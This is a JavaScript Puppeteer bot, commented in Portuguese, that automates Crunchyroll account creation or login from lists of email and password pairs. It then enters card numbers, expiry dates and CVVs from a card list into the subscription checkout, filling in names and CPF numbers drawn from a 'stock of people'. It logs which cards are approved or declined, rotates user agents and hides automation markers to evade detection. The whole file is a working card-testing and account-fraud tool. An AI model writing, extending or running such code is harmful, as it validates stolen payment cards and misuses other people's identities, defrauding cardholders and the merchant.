/**
 * Crunchyroll Bot v6.1 - MODO SINGLE (1 navegador)
 * 
 * Versão com apenas um navegador para uso em máquinas com menos recursos.
 * Use este arquivo se tiver problemas com o modo paralelo.
 * 
 * Para executar: node index_single.js
 * 
 * @version 6.1.0
 */

import puppeteer from 'puppeteer-extra';
import StealthPlugin from 'puppeteer-extra-plugin-stealth';
import readline from 'readline';

// Importações dos módulos refatorados
import CONFIG, { SELECTORS, INDICATORS, getRandomUserAgent, getUserAgentsDisponiveis } from './config/settings.js';
import { log, delay, colors, separator, banner } from './lib/helpers/logger.js';
import { removeCartao, removeConta } from './lib/helpers/file-helpers.js';
import {
  clickSelector,
  typeHuman,
  clickByText,
  clickByTexts,
  preencherInteligente,
  limparEDigitar,
  takeScreenshot
} from './lib/helpers/page-helpers.js';
import {
  inicializarEstoquePessoas,
  obterPessoa,
  marcarPessoaUsada,
  carregarCartoesTestados,
  cartaoTestado,
  marcarCartaoTestado,
  getCartoesDisponiveis,
  getContas,
  registrarContaCriada,
  registrarContaPremium,
  registrarLoginFalhou,
  registrarLoginSucesso,
  registrarSemCartao,
  registrarSemPagamento,
  registrarCartaoAprovado,
  registrarCartaoRecusado,
  getEstatisticasPessoas,
  getEstatisticasCartoes
} from './lib/helpers/data-manager.js';

// Configuração do Puppeteer com Stealth
puppeteer.use(StealthPlugin());

// ============================================
// CONTROLE DO TERMINAL
// ============================================
let pularConta = false;
let sairBot = false;

readline.emitKeypressEvents(process.stdin);
if (process.stdin.isTTY) {
  process.stdin.setRawMode(true);
}

process.stdin.on('keypress', (str, key) => {
  if (key.name === 's') {
    pularConta = true;
    console.log('\n>>> PULANDO CONTA...\n');
  }
  if (key.name === 'q') {
    sairBot = true;
    console.log('\n>>> SAINDO...\n');
    process.exit(0);
  }
  if (key.ctrl && key.name === 'c') {
    process.exit();
  }
});

// ============================================
// CRIAR CONTA
// ============================================
async function criarConta(page, email, senha) {
  log('Acessando pagina de registro...', 'step');
  await page.goto(CONFIG.URLS.REGISTRO, { waitUntil: 'networkidle2', timeout: CONFIG.NAVIGATION_TIMEOUT_MS });
  
  log(`Aguardando pagina (${CONFIG.DELAYS.AFTER_PAGE_LOAD / 1000}s)...`, 'info');
  await delay(CONFIG.DELAYS.AFTER_PAGE_LOAD);
  
  // Aceitar cookies
  await clickByTexts(page, SELECTORS.BUTTONS.ACEITAR_COOKIES);
  await delay(CONFIG.DELAYS.AFTER_CLICK);
  
  // ETAPA 1: Email
  log('ETAPA 1: Campo de e-mail', 'step');
  const emailClicked = await clickSelector(page, SELECTORS.AUTH.EMAIL_INPUT, 15000);
  if (!emailClicked) {
    log('Campo de email nao encontrado!', 'error');
    return { sucesso: false };
  }
  await delay(500);
  await typeHuman(page, email);
  await delay(1500);
  
  // ETAPA 2: Próximo
  log('ETAPA 2: Clicando PROXIMO', 'step');
  let proximoOk = await clickByTexts(page, SELECTORS.BUTTONS.PROXIMO);
  if (!proximoOk) await page.keyboard.press('Enter');
  
  // Aguardar campo de senha aparecer
  log('Aguardando campo de senha...', 'info');
  try {
    await page.waitForSelector(SELECTORS.AUTH.PASSWORD_INPUT, { visible: true, timeout: 20000 });
    log('Campo de senha apareceu!', 'success');
  } catch (e) {
    // Verificar se conta já existe
    const contaExiste = await page.evaluate((patterns) => {
      const body = (document.body.innerText || '').toLowerCase();
      return patterns.some(p => body.includes(p.toLowerCase()));
    }, INDICATORS.ACCOUNT_EXISTS);
    
    if (contaExiste) {
      log('Conta ja existe!', 'warn');
      return { sucesso: false, contaExiste: true };
    }
    
    log('Campo de senha demorou demais', 'warn');
  }
  
  // ETAPA 3: Senha
  log('ETAPA 3: Campo de senha', 'step');
  const senhaClicked = await clickSelector(page, SELECTORS.AUTH.PASSWORD_INPUT, 10000);
  if (!senhaClicked) {
    log('Campo de senha nao encontrado!', 'error');
    return { sucesso: false };
  }
  await delay(500);
  await typeHuman(page, senha);
  await delay(1500);
  
  // ETAPA 4: Criar conta
  log('ETAPA 4: Clicando CRIAR CONTA', 'step');
  let criarOk = await clickByTexts(page, SELECTORS.BUTTONS.CRIAR_CONTA);
  if (!criarOk) await page.keyboard.press('Enter');
  
  // Aguardar redirecionamento
  log('Aguardando redirecionamento (15s)...', 'info');
  await delay(15000);
  
  const urlAtual = page.url();
  
  // Verificar se conta já existe
  const contaExiste = await page.evaluate((patterns) => {
    const body = (document.body.innerText || '').toLowerCase();
    return patterns.some(p => body.includes(p.toLowerCase()));
  }, INDICATORS.ACCOUNT_EXISTS);
  
  if (contaExiste) {
    log('Conta ja existe!', 'warn');
    return { sucesso: false, contaExiste: true };
  }
  
  // Verificar se saiu da página de registro
  if (!urlAtual.includes('/register')) {
    log('Conta criada com sucesso!', 'success');
    return { sucesso: true };
  }
  
  log('Criacao pode ter falhado', 'warn');
  return { sucesso: false };
}

// ============================================
// FAZER LOGIN
// ============================================
async function fazerLogin(page, email, senha) {
  log('Acessando pagina de login...', 'step');
  await page.goto(CONFIG.URLS.LOGIN, { waitUntil: 'networkidle2', timeout: CONFIG.NAVIGATION_TIMEOUT_MS });
  
  await delay(5000);
  
  // Aceitar cookies
  await clickByTexts(page, SELECTORS.BUTTONS.ACEITAR_COOKIES);
  await delay(CONFIG.DELAYS.AFTER_CLICK);
  
  // Email
  log('Preenchendo email...', 'info');
  const emailClicked = await clickSelector(page, SELECTORS.AUTH.EMAIL_INPUT, 15000);
  if (!emailClicked) {
    log('Campo de email nao encontrado!', 'error');
    return false;
  }
  await delay(500);
  await typeHuman(page, email);
  await delay(1000);
  
  // Próximo
  await clickByTexts(page, SELECTORS.BUTTONS.PROXIMO);
  await delay(3000);
  
  // Senha
  log('Preenchendo senha...', 'info');
  const senhaClicked = await clickSelector(page, SELECTORS.AUTH.PASSWORD_INPUT, 10000);
  if (senhaClicked) {
    await delay(500);
    await typeHuman(page, senha);
    await delay(1000);
  }
  
  // Entrar
  await clickByTexts(page, SELECTORS.BUTTONS.ENTRAR);
  
  log('Aguardando login (15s)...', 'info');
  await delay(15000);
  
  const urlAtual = page.url();
  
  const loginFalhou = await page.evaluate((patterns) => {
    const body = (document.body.innerText || '').toLowerCase();
    return patterns.some(p => body.includes(p.toLowerCase()));
  }, INDICATORS.LOGIN_FAILED);
  
  if (loginFalhou) {
    log('Login falhou - senha incorreta!', 'error');
    return false;
  }
  
  if (!urlAtual.includes('/login')) {
    log('Login realizado com sucesso!', 'success');
    return true;
  }
  
  log('Login pode ter falhado', 'warn');
  return false;
}

// ============================================
// SELECIONAR CARTÃO DE CRÉDITO
// ============================================
async function selecionarCartaoCredito(page) {
  log('Selecionando Cartao de Credito...', 'step');
  await delay(CONFIG.DELAYS.AFTER_CLICK);
  
  // Método 1: h3 com classe _header_
  let clicou = await page.evaluate((selector, textos) => {
    const h3Elements = document.querySelectorAll(selector);
    for (const h3 of h3Elements) {
      const texto = (h3.innerText || h3.textContent || '').trim();
      if (textos.some(t => texto.includes(t))) {
        h3.click();
        if (h3.parentElement) h3.parentElement.click();
        return true;
      }
    }
    return false;
  }, SELECTORS.PAYMENT_METHOD.CARD_HEADER, SELECTORS.PAYMENT_METHOD.CARD_TEXTS);
  
  if (clicou) {
    log('Cartao de Credito selecionado!', 'success');
    await delay(CONFIG.DELAYS.AFTER_CLICK);
    return true;
  }
  
  // Método 2: Texto exato
  clicou = await page.evaluate((textos) => {
    const allElements = document.querySelectorAll('*');
    for (const el of allElements) {
      const texto = (el.innerText || el.textContent || '').trim();
      if (textos.includes(texto)) {
        el.click();
        let parent = el.parentElement;
        for (let i = 0; i < 3 && parent; i++) {
          parent.click();
          parent = parent.parentElement;
        }
        return true;
      }
    }
    return false;
  }, SELECTORS.PAYMENT_METHOD.CARD_TEXTS);
  
  if (clicou) {
    log('Cartao de Credito selecionado!', 'success');
    await delay(CONFIG.DELAYS.AFTER_CLICK);
    return true;
  }
  
  // Método 3: Radio buttons
  clicou = await page.evaluate((selector) => {
    const radios = document.querySelectorAll(selector);
    if (radios.length >= 3) {
      radios[2].click();
      const label = radios[2].closest('label') || document.querySelector(`label[for="${radios[2].id}"]`);
      if (label) label.click();
      return true;
    }
    return false;
  }, SELECTORS.PAYMENT_METHOD.RADIO_BUTTONS);
  
  if (clicou) {
    log('Cartao de Credito selecionado via radio!', 'success');
    await delay(CONFIG.DELAYS.AFTER_CLICK);
    return true;
  }
  
  log('Nao conseguiu selecionar Cartao de Credito!', 'error');
  return false;
}

// ============================================
// PREENCHER CARTÃO
// ============================================
async function preencherCartao(page, cartaoLine, pessoa) {
  const partes = cartaoLine.split('|');
  
  if (partes.length < 4) {
    log('Cartao invalido!', 'error');
    return { todosPreenchidos: false };
  }
  
  const num = partes[0];
  const mes = partes[1];
  const ano = partes[2];
  const cvv = partes[3];
  const nome = pessoa.nome;
  const cpf = pessoa.cpf;
  
  log(`Preenchendo cartao: ${num.slice(0, 4)} **** **** ${num.slice(-4)}`, 'cartao');
  log(`Dados: Nome=${nome}, CPF=${cpf}`, 'info');

  const validadeFormatada = `${mes}/${ano.slice(-2)}`;
  
  log('Preenchendo campos do formulario...', 'info');
  
  // Preencher campos usando seletores centralizados
  const nomeOk = await preencherInteligente(
    page,
    SELECTORS.PAYMENT_FORM.NAME.selectors,
    nome,
    'Nome'
  );
  await delay(CONFIG.DELAYS.BETWEEN_FIELDS);
  
  const cpfOk = await preencherInteligente(
    page,
    SELECTORS.PAYMENT_FORM.CPF.selectors,
    cpf,
    'CPF'
  );
  await delay(CONFIG.DELAYS.BETWEEN_FIELDS);
  
  const numOk = await preencherInteligente(
    page,
    SELECTORS.PAYMENT_FORM.CARD_NUMBER.selectors,
    num,
    'Numero do cartao'
  );
  await delay(CONFIG.DELAYS.BETWEEN_FIELDS);
  
  let valOk = await preencherInteligente(
    page,
    SELECTORS.PAYMENT_FORM.EXPIRY.selectors,
    validadeFormatada,
    'Validade'
  );
  await delay(CONFIG.DELAYS.BETWEEN_FIELDS);
  
  let cvvOk = await preencherInteligente(
    page,
    SELECTORS.PAYMENT_FORM.CVC.selectors,
    cvv,
    'CVC'
  );
  await delay(CONFIG.DELAYS.BETWEEN_FIELDS);

  // Tentar via Tab se não preencheu
  if (!valOk || !cvvOk) {
    log('Tentando via Tab...', 'info');
    try {
      const cardField = await page.$(SELECTORS.PAYMENT_FORM.CARD_NUMBER.selectors[0]);
      if (cardField) {
        await cardField.click();
        await delay(300);
        
        await page.keyboard.press('Tab');
        await delay(CONFIG.DELAYS.BETWEEN_FIELDS);
        
        if (!valOk) {
          await limparEDigitar(page, validadeFormatada);
          log('Validade preenchida via Tab!', 'success');
          valOk = true;
        }
        
        await page.keyboard.press('Tab');
        await delay(CONFIG.DELAYS.BETWEEN_FIELDS);
        
        if (!cvvOk) {
          await limparEDigitar(page, cvv);
          log('CVC preenchido via Tab!', 'success');
          cvvOk = true;
        }
      }
    } catch (e) {
      log(`Erro no metodo Tab: ${e.message}`, 'warn');
    }
  }

  const todosPreenchidos = nomeOk && cpfOk && numOk && valOk && cvvOk;
  
  if (todosPreenchidos) {
    log('Todos os campos preenchidos!', 'success');
  } else {
    log('Alguns campos podem nao ter sido preenchidos!', 'warn');
  }

  return { numOk, valOk, cvvOk, nomeOk, cpfOk, todosPreenchidos };
}

// ============================================
// CLICAR FINALIZAR
// ============================================
async function clicarFinalizar(page) {
  log('Clicando em finalizar...', 'step');
  await delay(CONFIG.DELAYS.AFTER_CLICK);
  
  // Tentar clicar nos botões de finalizar
  for (const botao of SELECTORS.BUTTONS.FINALIZAR) {
    if (await clickByText(page, botao)) {
      log(`Clicou em: ${botao}`, 'success');
      return true;
    }
  }
  
  // Fallback: botão submit
  await clickSelector(page, SELECTORS.PAYMENT_FORM.SUBMIT_BUTTON, 5000);
  return true;
}

// ============================================
// VERIFICAR SUCESSO
// ============================================
async function verificarSucesso(page) {
  log('Verificando resultado...', 'info');
  
  const MAX_VERIFICACOES = CONFIG.MAX_VERIFICACOES_RESULTADO;
  const INTERVALO = CONFIG.INTERVALO_VERIFICACAO_MS;
  
  for (let i = 0; i < MAX_VERIFICACOES; i++) {
    try {
      const urlAtual = page.url();
      
      // Sucesso por URL
      if (INDICATORS.SUCCESS.URL_PATTERNS.some(p => urlAtual.includes(p))) {
        log('URL de sucesso detectada!', 'success');
        return 'SUCESSO';
      }
      
      // Verificar texto e notificações
      const resultado = await page.evaluate((indicators) => {
        const body = (document.body.innerText || '').toLowerCase();
        
        // Verificar flash-message da Crunchyroll
        const flashMessage = document.querySelector('[class*="flash-message"], .flash-message__text');
        if (flashMessage) {
          const textoFlash = (flashMessage.innerText || flashMessage.textContent || '').toLowerCase();
          if (indicators.FAIL.TEXT_PATTERNS.some(p => textoFlash.includes(p.toLowerCase()))) {
            return { status: 'FALHA', motivo: 'flash-message' };
          }
        }
        
        // Verificar sucesso por texto
        if (indicators.SUCCESS.TEXT_PATTERNS.some(p => body.includes(p.toLowerCase()))) {
          return { status: 'SUCESSO' };
        }
        
        // Verificar falha por texto
        if (indicators.FAIL.TEXT_PATTERNS.some(p => body.includes(p.toLowerCase()))) {
          return { status: 'FALHA', motivo: 'texto' };
        }
        
        // Verificar se ainda está no checkout
        const aindaNoCheckout = body.includes('concluir compra') || 
                                body.includes('iniciar assinatura') ||
                                body.includes('cartão de crédito');
        
        return { status: 'PENDENTE', aindaNoCheckout };
      }, INDICATORS);
      
      if (resultado.status === 'SUCESSO') {
        log('Sucesso detectado!', 'success');
        return 'SUCESSO';
      }
      
      if (resultado.status === 'FALHA') {
        log(`Falha detectada: ${resultado.motivo || 'erro'}`, 'error');
        return 'FALHA';
      }
      
      // Log de progresso a cada 5 verificações
      if (i > 0 && i % 5 === 0) {
        log(`Verificacao ${i}/${MAX_VERIFICACOES}...`, 'info');
      }
      
    } catch (err) {
      // Se der erro "Execution context was destroyed" significa que a página navegou
      if (err.message.includes('Execution context was destroyed') || 
          err.message.includes('navigation')) {
        log('Pagina redirecionou - verificando URL...', 'info');
        await delay(2000);
        
        try {
          const urlAtual = page.url();
          if (INDICATORS.SUCCESS.URL_PATTERNS.some(p => urlAtual.includes(p))) {
            log('SUCESSO! Redirecionou para pagina de sucesso!', 'success');
            return 'SUCESSO';
          }
          if (urlAtual.includes('error') || urlAtual.includes('fail')) {
            log('Redirecionou para pagina de erro', 'error');
            return 'FALHA';
          }
        } catch (e) {
          log('Navegacao detectada - assumindo SUCESSO!', 'success');
          return 'SUCESSO';
        }
      }
    }
    
    await delay(INTERVALO);
  }
  
  log('Timeout - resultado nao confirmado', 'warn');
  return 'TIMEOUT';
}

// ============================================
// PROCESSAR CONTA
// ============================================
async function processarConta(email, senha, cartoes) {
  console.log(`\n${'='.repeat(50)}`);
  log(`Processando: ${email}`, 'conta');
  console.log(`${'='.repeat(50)}\n`);
  
  pularConta = false;
  
  let browser = null;
  let sucesso = false;
  
  try {
    // Configuração do browser com User-Agent aleatório
    const browserConfig = {
      ...CONFIG.BROWSER,
      args: [...CONFIG.BROWSER.args]
    };
    
    browser = await puppeteer.launch(browserConfig);
    
    const page = await browser.newPage();
    
    // Configura User-Agent aleatório (com rotação e remoção)
    const userAgentSelecionado = getRandomUserAgent();
    await page.setUserAgent(userAgentSelecionado);
    log(`User-Agent: ${userAgentSelecionado.slice(0, 60)}...`, 'info');
    
    // Remove indicadores de automação
    await page.evaluateOnNewDocument(() => {
      Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
    });
    
    page.setDefaultTimeout(CONFIG.PAGE_TIMEOUT_MS);
    
    // CRIAR CONTA
    const criacao = await criarConta(page, email, senha);
    
    if (pularConta || sairBot) return { sucesso: false, pulou: true };
    
    if (criacao.contaExiste) {
      // Conta já existe - tentar login com a senha fornecida no arquivo
      log(`Conta ja existe! Tentando fazer login com senha do arquivo...`, 'info');
      
      const loginSucesso = await fazerLogin(page, email, senha);
      
      if (loginSucesso) {
        registrarLoginSucesso(email, senha);
        log(`Login OK! Prosseguindo para testar cartoes...`, 'success');
      } else {
        log('Login falhou', 'error');
        registrarLoginFalhou(email, 'senha_incorreta');
        return { sucesso: false, contaExistente: true };
      }
    } else if (criacao.sucesso) {
      registrarContaCriada(email, senha);
    } else {
      return { sucesso: false };
    }
    
    // Filtrar cartões
    const cartoesDisponiveis = cartoes.filter(c => !cartaoTestado(c));
    
    if (cartoesDisponiveis.length === 0) {
      log('Nenhum cartao disponivel!', 'error');
      registrarSemCartao(email, senha);
      return { sucesso: false, semCartoes: true };
    }
    
    // PÁGINA DE PAGAMENTO
    log('Navegando para pagina de pagamento', 'step');
    await page.goto(CONFIG.URLS.PAGAMENTO, { waitUntil: 'networkidle2', timeout: CONFIG.NAVIGATION_TIMEOUT_MS });
    await delay(CONFIG.DELAYS.AFTER_PAGE_LOAD);
    
    // SELECIONAR CARTÃO
    log('Selecionando Cartao de Credito', 'step');
    await selecionarCartaoCredito(page);
    await delay(CONFIG.DELAYS.AFTER_SELECT_CARD);
    
    // TESTAR CARTÕES
    log('Testando cartoes...', 'step');
    
    let reloads = 0;
    const MAX_RELOADS = CONFIG.MAX_PAGE_RELOADS;
    const MAX_CARDS = CONFIG.MAX_CARDS_PER_ACCOUNT;
    
    for (let i = 0; i < cartoesDisponiveis.length && i < MAX_CARDS; i++) {
      if (pularConta || sairBot) break;
      
      const cartaoAtual = cartoesDisponiveis[i];
      
      if (cartaoTestado(cartaoAtual)) {
        log('Cartao ja testado, pulando...', 'warn');
        continue;
      }
      
      const partes = cartaoAtual.split('|');
      const num = partes[0] || '';
      
      console.log(`\n${'─'.repeat(40)}`);
      log(`Testando cartao ${i + 1}/${Math.min(cartoesDisponiveis.length, MAX_CARDS)}: ${num.slice(0, 4)}****${num.slice(-4)}`, 'cartao');
      console.log(`${'─'.repeat(40)}\n`);
      
      const pessoa = obterPessoa();
      if (!pessoa) {
        log('Sem pessoas disponiveis no estoque!', 'error');
        break;
      }
      
      marcarCartaoTestado(cartaoAtual);
      
      // Reload se não for primeiro
      if (i > 0) {
        if (reloads >= MAX_RELOADS) {
          log(`Maximo de ${MAX_RELOADS} reloads atingido!`, 'error');
          break;
        }
        
        reloads++;
        log(`Recarregando pagina (${reloads}/${MAX_RELOADS})...`, 'info');
        await page.goto(CONFIG.URLS.PAGAMENTO, { waitUntil: 'networkidle2', timeout: CONFIG.NAVIGATION_TIMEOUT_MS });
        await delay(5000);
        await selecionarCartaoCredito(page);
        await delay(3000);
      }
      
      // Preencher cartão
      await preencherCartao(page, cartaoAtual, pessoa);
      
      if (pularConta || sairBot) break;
      
      // Clicar finalizar
      await clicarFinalizar(page);
      await delay(CONFIG.DELAYS.AFTER_SUBMIT);
      
      // Verificar resultado
      const resultado = await verificarSucesso(page);
      
      if (resultado === 'SUCESSO') {
        log(`PAGAMENTO APROVADO com cartao ${num.slice(-4)}!`, 'success');
        sucesso = true;
        
        // Registrar sucesso
        registrarContaPremium(email, senha, cartaoAtual, pessoa);
        registrarCartaoAprovado(cartaoAtual, pessoa);
        removeCartao(cartaoAtual);
        marcarPessoaUsada(pessoa);
        
        break;
        
      } else {
        log(`Cartao ${num.slice(-4)} RECUSADO!`, 'error');
        
        registrarCartaoRecusado(cartaoAtual, pessoa);
        removeCartao(cartaoAtual);
        
        log('Tentando proximo cartao...', 'info');
      }
    }
    
    if (!sucesso && !pularConta) {
      log('Todos os cartoes falharam para esta conta', 'error');
      registrarSemPagamento(email, senha);
    }
    
    // Remover conta do arquivo após processamento (sucesso ou falha)
    if (!pularConta) {
      removeConta(email);
      log(`Conta ${email} removida da lista`, 'info');
    }
    
  } catch (err) {
    log(`Erro: ${err.message}`, 'error');
  } finally {
    if (browser) {
      log('Fechando navegador...', 'info');
      await delay(3000);
      await browser.close();
    }
  }
  
  return { sucesso, pulou: pularConta };
}

// ============================================
// MAIN
// ============================================
async function main() {
  console.clear();
  console.log(`
${colors.bright}${colors.cyan}╔════════════════════════════════════════════════════════════╗
║           CRUNCHYROLL BOT v${CONFIG.VERSION} - MODO SINGLE             ║
╠════════════════════════════════════════════════════════════╣
║  Modo de navegador único (para máquinas com menos RAM)     ║
║  Protecao contra loops infinitos                           ║
║  Timeout global de 5 minutos                               ║
║  Maximo ${CONFIG.MAX_PAGE_RELOADS} reloads por cartao                               ║
╠════════════════════════════════════════════════════════════╣
║  Pressione 'S' para PULAR  |  'Q' para SAIR                ║
╚════════════════════════════════════════════════════════════╝${colors.reset}
`);
  
  // Inicializar dados
  inicializarEstoquePessoas();
  carregarCartoesTestados();
  
  const contas = getContas();
  let cartoes = getCartoesDisponiveis();
  
  if (contas.length === 0) {
    log('Arquivo contas.txt vazio ou nao encontrado!', 'error');
    log('Coloque em: data/contas.txt', 'info');
    log('Formato: email|senha OU email:senha', 'info');
    process.exit(1);
  }
  
  if (cartoes.length === 0) {
    log('Arquivo cartoes.txt vazio ou nao encontrado!', 'error');
    log('Coloque em: data/cartoes.txt', 'info');
    log('Formato: numero|mes|ano|cvv', 'info');
    process.exit(1);
  }
  
  // Exibir estatísticas
  const estatPessoas = getEstatisticasPessoas();
  const estatCartoes = getEstatisticasCartoes();
  
  log(`Contas: ${contas.length}`, 'info');
  log(`Cartoes disponiveis: ${estatCartoes.disponiveis} (${estatCartoes.testados} ja testados)`, 'info');
  log(`Pessoas disponiveis: ${estatPessoas.disponiveis} (${estatPessoas.emCooldown} em cooldown)`, 'info');
  log(`User-Agents disponiveis: ${getUserAgentsDisponiveis()} (rotacao automatica)`, 'info');
  console.log('');
  
  let ok = 0, falha = 0, pulou = 0;
  
  for (const conta of contas) {
    if (sairBot) break;
    
    // Recarrega cartões disponíveis
    cartoes = getCartoesDisponiveis();
    if (cartoes.length === 0) {
      log('Sem cartoes disponiveis!', 'error');
      break;
    }
    
    const res = await processarConta(conta.email, conta.password, cartoes);
    
    if (res.pulou) pulou++;
    else if (res.sucesso) ok++;
    else falha++;
    
    log(`Progresso: ${ok} OK | ${falha} FALHA | ${pulou} PULOU`, 'info');
    
    if (!sairBot) {
      log(`Aguardando ${CONFIG.DELAYS.BETWEEN_ACCOUNTS / 1000}s...`, 'info');
      await delay(CONFIG.DELAYS.BETWEEN_ACCOUNTS);
    }
  }
  
  console.log(`\n${'='.repeat(50)}`);
  log('FINALIZADO', 'step');
  console.log(`${'='.repeat(50)}`);
  log(`Sucesso: ${ok}`, 'success');
  log(`Falha: ${falha}`, 'error');
  log(`Puladas: ${pulou}`, 'warn');
  
  process.exit(0);
}

main();
